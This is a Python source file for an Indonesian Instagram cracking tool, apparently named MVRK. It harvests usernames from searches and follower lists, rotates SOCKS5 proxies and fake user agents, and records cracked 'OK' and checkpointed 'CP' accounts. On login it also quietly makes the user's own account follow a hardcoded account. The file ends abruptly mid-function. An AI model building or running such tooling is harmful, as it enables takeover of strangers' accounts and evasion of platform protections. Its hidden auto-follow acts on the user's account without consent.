###----------[ IMPORT MODULE ]----------###
import requests, re, base64, os, json, time, sys, hashlib, hmac, uuid, random, datetime, calendar
from concurrent.futures import ThreadPoolExecutor as Modol
from datetime import datetime

###----------[ IMPORT MODULE RICH ]----------###
from rich.panel import Panel
from rich.tree import Tree
from rich import print as prints
from rich.console import Console
from rich.table import Table
from rich.columns import Columns
import zlib
import subprocess
import base64
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
console = Console()

###----------[ WARNA PRINT ]----------###
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
P = '\x1b[0m'    # WARNA MATI
M = '\x1b[1;96m' # MERAH
H = '\x1b[38;5;128m' # PINK
K = '\x1b[38;5;128m' # KUNING

###----------[ WARNA RICH ]----------###
Z2 = "[#000000]" # HITAM
M2 = "[#00FFFF]" # MERAH
H2 = "[#00FFFF]" # Biru
H3 = "[#00FF00]" #Hijau
K2 = "[#FF00FF]" # KUNING
B2 = "[#00C8FF]" # BIRU
U2 = "[#FFFFFF]" # UNGU
N2 = "[#FF00FF]" # PINK
O2 = "[#00FFFF]" # BIRU MUDA
P2 = "[#FFFFFF]" # PUTIH
J2 = "[#FF8F00]" # JINGGA
A2 = "[#AAAAAA]" # ABU-ABU

###----------[ GLOBAL NAMA ]----------###
method, ugentku, iyh = [], [], {}
reset = "[/]"
uadia, uadarimu, prox = [], [], []
sys.stdout.write('\x1b]2; MAVERICK\x07')

###----------[ AUTO CREATE FOLDER ]----------###
try:os.mkdir("data")
except:pass

###----------[ CONVERT BULAN ]----------###
day = datetime.now().strftime("%d-%b-%Y")
nyMnD = 5
nyMxD = 10
current_GMT = time.gmtime(time.time())
bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
bulan = ["Januari","Februari","Maret","April","Mei","Juni","Juli","Agustus","September","Oktober","November","Desember"]
month = datetime.now().month - 1
reall = bulan[month]
days = datetime.now().day
year = datetime.now().year
akunOK = f"OK-{days}-{reall}-{year}.txt"
akunCP = f"CP-{days}-{reall}-{year}.txt"

###----------[ WARNA TEMA ]----------###
try:
	file_color = open("assets/theme_color","r").read()
	color_rich = file_color.split("|")[0]
	color_table = file_color.split("|")[1]
except:
	color_rich = "[#00FFFF]"
	color_table = "#AF00FF"

###----------[ IP ADDRESS ]----------###
try:
	IP = requests.get("http://ip-api.com/json/").json()["query"]
	negara = requests.get("http://ip-api.com/json/").json()["country"]
	if "Indonesia" not in negara:
	   prints(Panel(f"""{P2}this script only work in Indonesia, please search another script""",width=80,padding=(0,6),style=f"{color_table}"))
	   time.sleep(3);exit()
except requests.exceptions.ConnectionError:
	print(f" {O}•{P} koneksi internet anda bermasalah")
	time.sleep(3);exit()

###----------[ PROXIES ]----------###
try:
    with requests.Session() as ses:
        _url = requests.get("https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt").text
        for xc in _url.splitlines():
            prox.append(xc)
except requests.exceptions.ConnectionError:
    prints(f" {H2}•{P2} koneksi internet anda bermasalah")
    time.sleep(0.3);exit()

class Instagram:

    def __init__(self):
        self.ses = requests.Session()
        self.ok, self.cp = [], []
        self.id, self.lo = [], 0
        self.gett()
        ###########self.Rayan = self.ses.get("https://api.countapi.xyz/hit/RayanXD/visits").json()["value"]
        self.menu()

    def hapus_coki(self):
        try:os.remove("data/Cookieig.txt")
        except:pass

    def timeLine(self):
       now = datetime.now()
       hours = now.hour
       if 4 <= hours < 12:timenow = "Selamat Pagi"
       elif 12 <= hours < 15:timenow = "Selamat Siang"
       elif 15 <= hours < 18:timenow = "Selamat Sore"
       else:timenow = "Selamat Malam"
       return timenow

    def clear(self):
        if "linux" in sys.platform.lower():
           os.system("clear")
        elif "win" in sys.platform.lower():
           os.system("cls")
    
    def loadCookie(self, Instagram):
        anim = ["[\x1b[1;91m■\x1b[0m□□□□□□□□□]","[\x1b[1;92m■■\x1b[0m□□□□□□□□]", "[\x1b[1;93m■■■\x1b[0m□□□□□□□]", "[\x1b[1;94m■■■■\x1b[0m□□□□□□]", "[\x1b[1;95m■■■■■\x1b[0m□□□□□]", "[\x1b[1;96m■■■■■■\x1b[0m□□□□]", "[\x1b[1;97m■■■■■■■\x1b[0m□□□]", "[\x1b[1;98m■■■■■■■■\x1b[0m□□]", "[\x1b[1;99m■■■■■■■■■\x1b[0m□]", "[\x1b[1;910m■■■■■■■■■■\x1b[0m]"]
        for i in range(50):
            time.sleep(0.1)
            sys.stdout.write(f"\r {O}•{N} tunggu, sedang login... " + anim[i % len(anim)] +"\x1b[0m ")
            sys.stdout.flush()
        print("")

    def loadUgents(self, Instagram):
        anim = ["[\x1b[1;91m■\x1b[0m□□□□□□□□□]","[\x1b[1;92m■■\x1b[0m□□□□□□□□]", "[\x1b[1;93m■■■\x1b[0m□□□□□□□]", "[\x1b[1;94m■■■■\x1b[0m□□□□□□]", "[\x1b[1;95m■■■■■\x1b[0m□□□□□]", "[\x1b[1;96m■■■■■■\x1b[0m□□□□]", "[\x1b[1;97m■■■■■■■\x1b[0m□□□]", "[\x1b[1;98m■■■■■■■■\x1b[0m□□]", "[\x1b[1;99m■■■■■■■■■\x1b[0m□]", "[\x1b[1;910m■■■■■■■■■■\x1b[0m]"]
        for i in range(50):
            time.sleep(0.1)
            sys.stdout.write(f"\r {O}•{N} mengganti useragent anda... " + anim[i % len(anim)] +"\x1b[0m ")
            sys.stdout.flush()
        print("")

    for xc in range(10000):
        rr = random.randint
        rc = random.choice
        dpi = ['133','320','515','160','640','240','120','800','480','225','768','216','1024']
        i_version = ['114.0.0.20.2','114.0.0.38.120','114.0.0.20.70','114.0.0.28.120','114.0.0.0.24','114.0.0.0.41']
        pxl_phone = ['623x1280','700x1245','800x1280','1080x2340','1320x2400','1242x2688']
        UserAgents1 = f"Instagram {str(rc(i_version))} Android (23/{str(rr(9,12))}; {str(rc(dpi))}dpi; {str(rc(pxl_phone))}; vivo; vivo Xplay5S; PD1516A; qcom; ru; 99640911)"
        UserAgents2 = f"Mozilla/5.0 (Linux; Android {str(rr(9,12))}; RMX3063 Build/QP1A.{str(rr(111111,199999))}.020; in-id) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,99))}.0.{str(rr(3500,3999))}.{str(rr(75,150))} Mobile Safari/537.36 Puffin/9.7.2.{str(rr(51111,59999))}AP"
        UserAgents3 = f"Mozilla/5.0 (Linux; Android 12; RMX3371 Build/RKQ1.211119.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36"
        UserAgents4 = f"iPhone13,4(iOS/14.8.1) AliApp(AliExpress/8.51.0) Weex/0.28.0 vercode/316 1284x2778"
        UserAgents5 = f"Mozilla/5.0 (Linux; Android 11; PFUM10 Build/RKQ1.211119.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36"
        UserAgents6 = f"Mozilla/5.0 (Linux; Android 11; CPH2109 Build/RKQ1.200903.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.210 Mobile Safari/537.36 Instagram 187.0.0.32.120 Android (30/11; 480dpi; 1080x2161; OPPO; CPH2109; OP4BA5L1; qcom; ru_RU; 289692198)"
        ugent = str(rc([UserAgents1, UserAgents2, UserAgents3, UserAgents4, UserAgents5, UserAgents6]))
        ugentku.append(ugent)
    
    def logoo1(self):
        self.clear()
        #prints(f"{M2}⬤{K2}⬤{N2}⬤{reset}")
        prints(Panel(f"""{K2}
\t{M2}╔═╗┌─┐┌─┐┬┌─┬┌─┐┌─┐       ╦┌─┐
\t{M2}║  │ ││ │├┴┐│├┤ └─┐  ───  ║│ ┬
\t{P2}╚═╝└─┘└─┘┴ ┴┴└─┘└─┘       ╩└─┘ 2.1
""",title=f"{P2}{N2}{self.timeLine()}",width=80,padding=(0,4),style=f"{color_table}"))
    def logoo(self):
        self.clear()
        #prints(f"{M2}⬤{K2}⬤{N2}⬤{reset}")
        prints(Panel(f"""{H2}
\t{M2}╔═╗┬─┐┌─┐┌─┐┬┌─┌─┐┬─┐ {M2}>{K2} Recode{M2} :{P} Vindra
\t{M2}║  ├┬┘├─┤│  ├┴┐├┤ ├┬┘ {M2}>{P} Author{M2} :{P} BrayenXD 
\t{P2}╚═╝┴└─┴ ┴└─┘┴ ┴└─┘┴└─ {M2}>{P} Versi{M2}  :{H2} 2.1 
""",title=f"{P2}{N2}{self.timeLine()}",width=80,padding=(0,4),style=f"{color_table}"))
    def convert(self, xx, cok):
        try:
            id = self.ses.get(f'https://i.instagram.com/api/v1/users/web_profile_info/?username={xx}', cookies={"cookie":cok}, headers={"user-agent":self.ua_ig(),"x-ig-app-id":'936619743392459'}).json()["data"]["user"]
            xz = id["id"]
        except:pass
        return xz

    def ua_ig(self):
        return "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3"

    def login(self):
        self.logoo1()
        prints(Panel(f"{P2}Masukkan {color_rich}Cookie{P2} Instagram Kamu, Di Sarankan Menggunakan Akun Tumbal",width=80,padding=(0,3),style=f"{color_table}"))
        coki = input(f" {O}•{N} Masukan Cookie : {O}")
  #      self.loadCookie(Instagram)
        if coki in ["", ""]:
            print(f" {O}•{N} {M}Masukan cookie, Jangan Kosong!")
            time.sleep(3);self.login()
        try:
            id = re.search("ds_user_id=(\d+)", str(coki)).group(1)
            po = self.ses.get(f"https://i.instagram.com/api/v1/users/{id}/info/",headers={"user-agent":self.ua_ig()},cookies={"cookie":coki})
            xx = json.loads(po.text)
            if "full_name" in str(xx):
                nama = xx["user"]["full_name"]
                ngtd = re.search("csrftoken=(.*?);", str(coki)).group(1);self.cook(ngtd, coki)
                open("data/Cookieig.txt", "w").write(coki)
                prints(Panel(f"{P2}Selamat Datang {color_rich}{nama}{P2} Login Berhasil Jalankan Ulang python run.py",width=80,padding=(0,4),style=f"{color_table}"))
                time.sleep(3);exit()
            elif "challenge_required" in str(xx):
                print(f" {O}•{N} {K}Akun Anda Terkena Checkpoint")
                time.sleep(3);self.login()
            else:
                print(f" {O}•{N} {M}Cookie Invalid Silahkan Ganti Cookie")
                time.sleep(3);self.login()
        except (json.decoder.JSONDecodeError, KeyError, AttributeError):
            print(f" {O}•{N} cookie invalid")
            time.sleep(3);self.login()
        except requests.ConnectionError:
            print(f" {O}•{N} {M}Koneksi Internet Anda Bermasalah")
            time.sleep(3);exit()

    def gett(self):
        try:
            iyh.update(self.ses.get("https://pastebin.com/raw/Q7Lqe7s9").json())
        except requests.ConnectionError:
            self.logoo()
            print(f" {O}•{N} {M}Koneksi Internet Anda Bermasalah")
            time.sleep(3);exit()

    def cook(self, tok, cok):
        try:
            head = {
                "Host": "i.instagram.com",
                "content-length": "0",
                "sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"',
                "x-ig-app-id": "1217981644879628",
                "x-ig-www-claim": "hmac.AR2bJKYJnPYmZqv19akfq13Zn4tplhuXb9TC9PwFk03Dg7NV",
                "sec-ch-ua-mobile": "?1",
                "x-instagram-ajax": "1006447742",
                "viewport-width": "360",
                "content-type": "application/x-www-form-urlencoded",
                "accept": "*/*",
                "user-agent": self.ua_ig(),
                "x-asbd-id": "198387",
                "save-data": "on",
                "x-csrftoken": tok,
                "sec-ch-ua-platform": '"Android"',
                "origin": "https://www.instagram.com",
                "sec-fetch-site": "same-site",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://www.instagram.com/",
                "accept-encoding": "gzip, deflate, br",
                "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,ru;q=0.6,jv;q=0.5"
            }
            self.ses.post("https://i.instagram.com/api/v1/web/friendships/{}/follow/".format("57286292748"), headers = head, cookies={"cookie":cok})
        except requests.ConnectionError:
            self.logoo()
            print(f" {O}•{N} {M}Koneksi Internet Anda Bermasalah")
            time.sleep(3);exit()

    def ua_Cok(self):
        rr = random.randint
        rc = random.choice
        merk2 = str(rc(["SM-A715F","SM-A715W","SM-A716U","SM-A716V","SM-A716U1","SM-G7108"]))
        real = str(rc(["Lenovo TB2-X30L","ONEPLUS A5000","LGLS665","vivo Y51L","LG-M150","vivo Y21","OPPO A59s","OPPO R9 Plusm A","vivo Y71A","CPH1719","vivo Y35","vivo X20","Aquaris M5.5","vivo X6D","OPPO R11","Aquaris X5","Aquaris E5","Lenovo TB3-710","FS510","FS405","ONEPLUS A5010","NX531J","ONEPLUS A3003","LG-H870DS","Nexus 5X","Aquaris X2"]))
        me = str(rc(["RE54ABL1","RE513CL1","RMX3081L1","RE54ABL1","RMX3201","RMX1851"]))
        com = str(rc(["qcom","mt6833","mt6765"]))
        comi = "in_ID"
        dpi = str(rc(["133","320","515","160","640","240","120","800","480","225","768","216","1024"]))
        pxl = str(rc(["1080x2161","1080x2158","1080x2290","720x1448","1080x2264","623x1280","700x1245","800x1280","1080x2340","1320x2400","1242x2688"]))
        igv = ("10.1.0,10.1.0,10.1.0,10.1.0,10.2.0,10.2.0,10.2.0,10.2.1,10.3.0,10.3.0,10.34.0,10.34.0,100.0.0.17.129,101.0.0.15.120,102.0.0.20.117,103.0.0.15.119,103.1.0.15.119,104.0.0.21.118,105.0.0.18.119,106.0.0.24.118,107.0.0.27.121,108.0.0.23.119,109.0.0.18.124,11.0.0.1.20,11.0.0.11.20,11.0.0.12.20,11.0.0.3.20,110.0.0.16.119,111.0.0.24.152,111.1.0.25.152,112.0.0.29.121,113.0.0.38.122,114.0.0.38.120,116.0.0.34.121,117.0.0.28.123,12.0.0.2.91,12.0.0.4.91,12.0.0.5.91,120.0.0.29.118,121.0.0.29.119,122.0.0.29.238,123.0.0.21.114,125.0.0.20.126,126.0.0.25.121,127.0.0.30.121,128.0.0.26.128,129.0.0.29.119,13.0.0.1.91,130.0.0.31.121,131.0.0.23.116,131.0.0.25.116,132.0.0.26.134,133.0.0.32.120,134.0.0.26.121,135.0.0.28.119,136.0.0.34.124,15.0.0.11.90,15.0.0.5.90,15.0.0.9.90,16.0.0.1.90,16.0.0.11.90,16.0.0.13.90,16.0.0.5.90,17.0.0.14.91,17.0.0.2.91,17.0.0.5.91,19.1.0.31.91,20.0.0.10.75,20.0.0.19.75,20.0.0.29.75,20.0.0.29.75,21.0.0.1.62,21.0.0.11.62,21.0.0.3.62,21.0.0.8.62,22.0.0.3.68,23.0.0.14.135,25.0.0.1.136,25.0.0.11.136,25.0.0.20.136,25.0.0.26.136,26.0.0.1.86,26.0.0.10.86,26.0.0.13.86,26.0.0.5.86,27.0.0.11.97,27.0.0.2.97,27.0.0.7.97,27.0.0.9.97,28.0.0.2.284,28.0.0.6.284,28.0.0.7.284,28.0.0.7.284,29.0.0.1.95,29.0.0.13.95,29.0.0.3.95,29.0.0.7.95,30.0.0.1.95,30.0.0.10.95,30.0.0.12.95,30.0.0.5.95,31.0.0.1.94,31.0.0.10.94,31.0.0.4.94,31.0.0.9.94,32.0.0.1.94,32.0.0.14.94,32.0.0.16.94,32.0.0.7.94,33.0.0.1.92,33.0.0.11.92,33.0.0.5.92,33.0.0.8.92,34.0.0.10.93,34.0.0.12.93,34.0.0.3.93,34.0.0.4.93,35.0.0.14.96,35.0.0.20.96,35.0.0.3.96,35.0.0.7.96,36.0.0.3.91,36.0.0.7.91,37.0.0.15.97,37.0.0.21.97,38.0.0.12.95,38.0.0.13.95,38.0.0.3.95,38.0.0.7.95,39.0.0.12.93,39.0.0.16.93,39.0.0.19.93,39.0.0.4.93,40.0.0.12.95,40.0.0.3.95,40.0.0.7.95,41.0.0.10.92,42.0.0.17.95,42.0.0.19.95,42.0.0.2.95,48.0.0.15.98,49.0.0.15.89,5.0.8,5.1.7,51.0.0.20.85,52.0.0.8.83,53.0.0.13.84,54.0.0.14.82,54.0.0.14.82,55.0.0.12.79,59.0.0.23.76,6.10.1,6.11.2,6.12.0,6.12.1,6.12.2,6.13.0,6.13.1,6.13.3,6.14.0,6.14.0,6.14.1,6.15.0,6.15.0,6.15.0,6.16.0,6.16.0,6.16.0,6.16.1,6.17.0,6.17.0,6.17.1,6.18.0,6.18.0,6.18.0,6.18.0,6.19.0,6.19.0,6.19.0,6.19.0,6.20.0,6.20.0,6.20.1,6.20.1,6.20.2,60.0.0.16.79,60.1.0.17.79,63.0.0.17.94,63.0.0.17.94,64.0.0.14.96,67.0.0.24.100,7.0.0,7.0.0,7.1.0,7.1.0,7.1.1,7.2.0,7.2.0,7.2.0,7.2.1,7.2.2,7.2.3,7.2.4,7.3.0,7.3.0,7.3.0,7.3.0,7.5.0,7.5.0,7.5.0,7.5.1,7.5.2,7.6.0,7.6.0,7.6.0,7.6.1,7.7.0,7.7.0,7.7.0,7.7.0,7.7.0,7.8.0,7.8.0,70.0.0.21.98,70.0.0.22.98,71.0.0.18.102,73.0.0.22.185,75.0.0.23.99,76.0.0.15.395,78.0.0.11.104,8.1.0,8.1.0,8.1.0,8.1.0,8.2.0,8.2.0,8.2.0,8.2.0,8.5.0,8.5.0,8.5.0,8.5.1,80.0.0.14.110,82.0.0.13.119,83.0.0.20.111,84.0.0.21.105,85.0.0.21.100,86.0.0.19.87,86.0.0.24.87,88.0.0.14.99,9.0.0,9.0.0,9.0.0,9.1.5,9.1.5,9.2.0,9.2.0,9.2.0,9.2.0,9.2.0,9.2.5,9.2.5,9.2.5,90.0.0.18.110,91.0.0.18.118,92.0.0.15.114,93.1.0.19.102,94.0.0.22.116,95.0.0.21.124,96.0.0.28.114,99.0.0.32.182")
        igve = igv.split(",")
        andro = str(rc(["30/11","31/12","29/10"]))
        versi = str(rc(igve))
        return (f"Instagram {versi} Android ({andro}; {dpi}dpi; {pxl}; realme; {real}; {me}; {com}; {comi})")

    def menu(self):
        self.logoo()
     #   os.popen('data/play-audio/menu.mp3')
        try:
            lisen = open('data/lisensi.txt','r').read()
            met = self.ses.get('https://app.cryptolens.io/api/key/Activate?token=WyIzNTA3NDM0MSIsIlZxUGJPU3pxZUxJeEEyZU1hSGNCbFFHYXh6VHBmSWlYc25QQ2piYmsiXQ==&ProductId=18415&Key='+lisen).json()
            men = met['licenseKey']
            key = men['key'][0:11]
            tahun = men['expires'][0:4]
            buln = men['expires'][5:7]
            tanggal = men['expires'][8:10]
            bulan = bulan_ttl[buln]
            tahun1 = men['created'][0:4]
            buln1 = men['created'][5:7]
            tanggal1 = men['created'][8:10]
            bulan1 = bulan_ttl[buln1]
        except:
            key = "-"
            tanggal = "-"
            bulan = "-"
            tahun = "-"
            tanggal1 = "-"
            bulan1 = "-"
            tahun1 = "-"
        try:
            sen = open("data/lisensi.txt","r").read()
            prem = f"{H2}Iya"
        except (KeyError,FileNotFoundError):
            prem = f"{N2}Iya"
        try:
            coki = open("data/Cookieig.txt", "r").read()
            user = re.search('ds_user_id=(\d+)',str(coki)).group(1)
        except FileNotFoundError:
            self.login()
        try:
            xxxx = self.ses.get(f"https://i.instagram.com/api/v1/users/{user}/info/", headers={"user-agent":self.ua_ig()}, cookies={"cookie":coki}).json()["user"]
            nama = xxxx["full_name"]
            user = xxxx["username"]
            flow = xxxx["follower_count"]
            flos = xxxx["following_count"]
        except (json.decoder.JSONDecodeError, KeyError, AttributeError, TypeError):
            print(f" {H}•{O}Opsh Akun Tumbal Terkena Chekpoint{H}")
            self.hapus_coki();time.sleep(3);self.login()
        except requests.ConnectionError:
            print(f" {O}•{N} {M}Koneksi Internet Anda Bermasalah")
            time.sleep(3);exit()
        prints(Panel(f"{H2}{IP}",title=f"{P2}IP",subtitle=f"{P2}{negara}",width=80,padding=(0,30),style=f"{color_table}"))
        urut = []
        urut.append(Panel(f'{P2}Nama      : {H2}{nama}\n{P2}Username  : {H2}{user}\n{P2}Pengikut  : {H2}{flow}\n{P2}Mengikuti : {H2}{flos}',width=40,padding=(0,2),title=f"{H2}Pengguna",style=f"{color_table}"))
        urut.append(Panel(f'{P2}lisensi : {N2}{key}-****-****\n{P2}join    : {N2}{tanggal1} {bulan1} {tahun1}\n{P2}expired : {N2}{tanggal} {bulan} {tahun}\n{P2}premium : {prem}',width=38,padding=(0,2),title=f"{H2}Lisensi",style=f"{color_table}"))
        console.print(Columns(urut))
        prints(Panel(f"{P2}[{color_rich}01{P2}]. Dump Dari Pencarian Nama {P2}[{color_rich}04{P2}]. Hapus Lisensi\n{P2}[{color_rich}02{P2}]. Dump Dari Pengikut       {P2}[{color_rich}05{P2}]. Report Bug Script\n{P2}[{color_rich}03{P2}]. Dump Dari Mengikuti      {P2}[{color_rich}00{P2}]. Keluar ({N2}delete cookie{P2})",width=80,padding=(0,7),style=f"{color_table}"))
        prints(Panel(f"""\t{M2} {color_rich}Menu2 Atau 99{H2}""",width=80,padding=(0,21),style=f"{color_table}"))
        pil = input(f" {O}•{N} Pilih Menu :  {O}")
        
        if pil in ["", " "]:
            print(f" {O}•{N} Pilihan Tidak Boleh Kosong")
            time.sleep(2);self.menu()
        
        elif pil in ["1", "01"]:
            prints(Panel(f"""{P2}Gunakan Koma ({color_rich},{P2}) Sebagai Massal""",width=80,padding=(0,4),style=f"{color_table}"))
            nama = input(f" {O}•{N} Masukan Nama : {O}").split(",")
            prints(Panel(f"{P2}Proses Dump Username Tekan {color_rich}CTRL + C{P2} Untuk Berhenti",width=80,padding=(0,4),style=f"{color_table}"))
            pexx = []
            try:
                for i in nama:
                    pexx.append(i)
                with Modol(max_workers=35) as bool:
                    for a in pexx:
                        bool.submit(self.search, f"https://www.instagram.com/web/search/topsearch/?count=100000&context=blended&query={a}&rrank_token=0.35875757839675004&include_reel=true")
            except(requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout):
                print(f" {O}•{N} {M}Koneksi Internet Anda Bermasalah")
                time.sleep(3);exit()
            except (KeyError, json.decoder.JSONDecodeError):
                prints(Panel(f"{M2}Gagal Mengambil Username, Kemungkinan Target Private Bukan Publik",width=80,padding=(0,4),style=f"{color_table}"));exit()
            self.mulai()
        
        elif pil in ["2", "02"]:
            prints(Panel(f"{M2}Pastikan Username Target Bersifat Publik !!!!",width=80,padding=(0,2),style=f"{color_table}"))
            nama = input(f" {O}•{N} masukan username : {O}")
            if nama in ["", " "]:
                print(f" {H}•{N} {M}isi kontol jangan kosong");time.sleep(2);self.menu()
            try:
                xzxz = self.convert(nama, coki)
                prints(Panel(f"{P2}Proses Dump Username Tekan {color_rich}CTRL + C{P2} Untuk Berhenti",width=80,padding=(0,4),style=f"{color_table}"))
                self.dump(xzxz, coki, "followers", "")
            except(requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout):
                print(f" {O}•{N} Koneksi Internet Anda Bermasalah")
                time.sleep(3);exit()
            except (KeyError, UnboundLocalError):
                prints(Panel(f"{M2}Gagal Mengambil Username, Kemungkinan Akun Target Private Bukan Publik",width=80,padding=(0,4),style=f"{color_table}"));exit()
            self.mulai()
        
        elif pil in ["3", "03"]:
            prints(Panel(f"{P2}Pastikan Username Target Bersifat Publik",width=80,padding=(0,2),style=f"{color_table}"))
            nama = input(f" {O}•{N} Masukan Username : {O}")
            if nama in ["", " "]:
                print(f" {O}•{N} isi kontol jangan kosong");time.sleep(2);self.menu()
            try:
                xzxz = self.convert(nama, coki)
                prints(Panel(f"{P2}Proses Dump Username Tekan {color_rich}CTRL + C{P2} Untuk Berhenti",width=80,padding=(0,4),style=f"{color_table}"))
                self.dump(xzxz, coki, "following", kos="")
            except(requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout):
                print(f" {O}•{N} {M}Koneksi Internet Anda Bermasalah")
                time.sleep(3);exit()
            except (KeyError, UnboundLocalError):
                prints(Panel(f"{P2}Gagal Mengambil Username, Kemungkinan Akun Target Private Bukan Publik",width=80,padding=(0,4),style=f"{color_table}"));exit()
            self.mulai()
        
        elif pil in ["4", "04"]:
            xc = input(f" {O}•{N} Apakah Kamu Ingin Menghapus Lisensi? (Y/t) : {O}")
            if xc in ["",""]:
              print(f" {H}•{N} jangan kosong kontol")
              time.sleep(3);self.menu()
            elif xc in ["Y","y"]:
                print(f" {H}•{N} Berhasil Menghapus Lisensi Kamu")
                os.remove("data/lisensi.txt")
                time.sleep(3);exit()
            elif xc in ["T","t"]:
                self.menu()
            else:
                print(f" {H}•{N} ngetik apaan kontol")
                time.sleep(2);self.menu()
        
        elif pil in ["5", "05"]:
            try:
                os.system("xdg-open https://wa.me/+6283844680925")
                time.sleep(2);exit()
            except(requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout):
                print(f" {H}•{N} {M}Koneksi Internet Anda Bermasalah")
                exit()
        
        elif pil in ["0","00"]:
            prints(Panel(f'{N2}{open("data/Cookieig.txt","r").read()}',style=f"{color_table}"))
            xc = input(f" {H}•{N} Apakah Kamu Ingin Menghapus Cookie? (Y/t) : {H}")
            if xc in ["",""]:
              print(f" {H}•{N} jangan kosong kontol")
              time.sleep(3);self.menu()
            elif xc in ["Y","y"]:
                print(f" {H}•{N} Berhasil Menghapus Cookie Kamu")
                self.hapus_coki();time.sleep(3);exit()
            elif xc in ["T","t"]:
                self.menu()
            else:
                print(f" {H}•{N} ngetik apaan kontol")
                time.sleep(2);self.menu()

    #    elif pil in ["bot","Bot","BOT"]:
 #           self.bots()        
        elif pil in ["menu2","Menu2","99"]:
            self.lains()
        else:
            print(f" {H}•{N} ngetik apaan kontol")
            time.sleep(2);self.menu()
        
    def bots(self):
        prints(Panel(f"{P2}[{color_rich}011{P2}]. bot auto un-followers     {P2}[{color_rich}03{P2}]. bot auto like postingan\n{P2}[{color_rich}02{P2}]. bot auto un-following     {P2}[{color_rich}04{P2}]. bot auto followers",width=80,padding=(0,7),style=f"{color_table}"))
        ask = input(f" {H}•{N} pilihan bot : {H}")
        if ask in ["",""]:
           print(f" {H}•{N} pilihan tidak boleh kosong")
           time.sleep(2);self.menu()
        elif ask in ["11","011"]:
            prints(Panel(f"{P2}mohon maaf user {color_rich}trial{P2} tidak bisa menggunakan tools bot instagram",width=80,padding=(0,6),style=f"{color_table}"))
            time.sleep(4);self.menu()
        elif ask in ["2","02"]:
            prints(Panel(f"{P2}mohon maaf user {color_rich}trial{P2} tidak bisa menggunakan tools bot instagram",width=80,padding=(0,6),style=f"{color_table}"))
            time.sleep(4);self.menu()
        elif ask in ["3","03"]:
            prints(Panel(f"{P2}mohon maaf user {color_rich}trial{P2} tidak bisa menggunakan tools bot instagram",width=80,padding=(0,6),style=f"{color_table}"))
            time.sleep(2);self.menu()
        elif ask in ["4","04"]:
            prints(Panel(f"{P2}mohon maaf user {color_rich}trial{P2} tidak bisa menggunakan tools bot instagram",width=80,padding=(0,6),style=f"{color_table}"))
            time.sleep(4);self.menu()
        else:
             print(f" {H}•{N} ngetik apaan ngab")
             time.sleep(2);self.menu()
    
    def lains(self):
        prints(Panel(f"{U2}[{color_rich}01{U2}]. Check Akun Hasil Crack     {U2}[{color_rich}03{U2}]. Settting UserAgent\n{U2}[{color_rich}02{U2}]. Gabung Group WhatsApp Typo      {U2}[{color_rich}04{U2}]. Ambil UserAgent",width=80,padding=(0,7),style=f"{color_table}"))
        prints(Panel(f"{U2}[{color_rich}05{U2}]. Lihat Jumlah Pengguna Script MVRK\n{U2}[{color_rich}06{U2}]. Ganti Warna Tema Tools MVRK",width=80,padding=(0,13),style=f"{color_table}"))
        ask = input(f" {H}•{N} Pilih Menu : {O}")
        if ask in ["",""]:
           print(f" {H}•{N} {M}Pilihan Tidak Boleh Kosong")
           time.sleep(2);self.menu()
        elif ask in ["1","01"]:
            self.checkHasil()
        elif ask in ["2","02"]:
            self.joinGrup()
        elif ask in ["3","03"]:
            self.SettingUgent()
        elif ask in ["4","04"]:
            self.getUserAgent()
        elif ask in ["5","05"]:
            prints(Panel(f"{P2}Jumlah Pengguna Script MVRK {color_rich}{self.MVRK}{P2} Orang",width=80,padding=(0,15),style=f"{color_table}"))
            time.sleep(3)
            print(f" {H}•{N} Kamu Adalah Pengguna Ke {H}{self.MVRK} {N}Terimakasih:)")
            time.sleep(5);self.menu()
        elif ask in ["6","06"]:
            self.ganti_tema()
        else:
             print(f" {H}•{N} ngetik apaan kontol")
             time.sleep(2);self.menu()
    
    def ganti_tema(self):
         prints(Panel(f"""{P2}[{color_rich}01{P2}]. Ganti Warna Tema Merah  [{color_rich}06{P2}]. Ganti Warna Tema Pink
[{color_rich}02{P2}]. Ganti Warna Tema Hijau  [{color_rich}07{P2}]. Ganti Warna Tema Cyan
[{color_rich}03{P2}]. Ganti Warna Tema Kuning [{color_rich}08{P2}]. Ganti Warna Tema Putih
[{color_rich}04{P2}]. Ganti Warna Tema Biru   [{color_rich}09{P2}]. Ganti Warna Tema Orange
[{color_rich}05{P2}]. Ganti Warna Tema Ungu   [{color_rich}10{P2}]. Ganti Warna Tema Abu-Abu""",width=80,padding=(0,7),style=f"{color_table}"))
         ask = console.input(f" {H2}• {P2}pilih tema : ")
         if ask in["01","1"]:warna = "[#FF0000]";teks="merah"
         elif ask in["02","2"]:warna = "[#00FFFF]";teks="hijau"
         elif ask in["03","3"]:warna = "[#FFFF00]";teks="kuning"
         elif ask in["04","4"]:warna = "[#00C8FF]";teks="biru"
         elif ask in["05","5"]:warna = "[#FFFFFF]";teks="ungu"
         elif ask in["06","6"]:warna = "[#FF00FF]";teks="pink"
